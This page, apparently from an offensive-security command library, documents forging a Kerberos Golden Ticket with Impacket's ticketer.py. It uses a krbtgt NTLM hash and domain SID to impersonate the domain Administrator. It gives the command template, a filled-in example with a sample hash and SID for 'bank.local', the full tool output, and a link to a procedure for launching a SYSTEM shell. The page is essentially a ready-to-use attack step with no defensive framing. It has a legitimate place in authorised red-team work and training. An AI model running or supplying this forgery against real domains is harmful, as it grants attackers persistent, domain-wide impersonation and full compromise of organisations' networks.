---
id: a26e3e85-54bd-43cb-b6da-4c090d802555
name: ticketer-create-golden-ticket
type: command
executor: bash
data: >-
  ticketer.py -nthash $_NTLM_HASH -domain-sid $_DOMAIN_SID -domain $_DOMAIN 
  Administrator
output: >-
  root@kali:~# ticketer.py -nthash 7257228d1626640fb895708eb809c20e -domain-sid
  S-1-5-21-2291914956-2855975875-54887866952 -domain bank.local  Administrator

  Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth
  Corporation


  [*] Creating basic skeleton ticket and PAC Infos

  [*] Customizing ticket for bank.local/Administrator

  [*]     PAC_LOGON_INFO

  [*]     PAC_CLIENT_INFO_TYPE

  [*]     EncTicketPart

  [*]     EncAsRepPart

  [*] Signing/Encrypting final ticket

  [*]     PAC_SERVER_CHECKSUM

  [*]     PAC_PRIVSVR_CHECKSUM

  [*]     EncTicketPart

  [*]     EncASRepPart

  [*] Saving ticket in Administrator.ccache
created_at: '2020-06-24T05:08:26.192120+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - forgery
verified: true
validated: true
---

# ticketer-create-golden-ticket

## Command

```bash
ticketer.py -nthash $_NTLM_HASH -domain-sid $_DOMAIN_SID -domain $_DOMAIN  Administrator
```

## Description

This command forges a Golden Ticket (TGT) using Impacket's ticketer.py with the krbtgt NTLM hash, domain SID, and domain name, impersonating the Administrator user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -nthash $_NTLM_HASH | krbtgt NTLM hash (32 hex chars) | Yes |
| -domain-sid $_DOMAIN_SID | Full domain SID (e.g., S-1-5-21-...) | Yes |
| -domain $_DOMAIN | Domain name (e.g., bank.local) | Yes |
| Administrator | Target username to impersonate | Yes |

## Examples

### Basic Usage

```bash
ticketer.py -nthash 7257228d1626640fb895708eb809c20e -domain-sid S-1-5-21-2291914956-2855975875-54887866952 -domain bank.local Administrator
```

### Advanced Usage

Create ticket for custom user:
```bash
ticketer.py -nthash hash -domain-sid sid -domain domain customuser
```

## Expected Output

```
root@kali:~# ticketer.py -nthash 7257228d1626640fb895708eb809c20e -domain-sid S-1-5-21-2291914956-2855975875-54887866952 -domain bank.local  Administrator
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for bank.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

The ccache file is created for use in subsequent Kerberos operations.

## Related

- [[procedures/Create-Golden-Ticket-and-Launch-Windows-SYSTEM-Shell-from-Linux]]
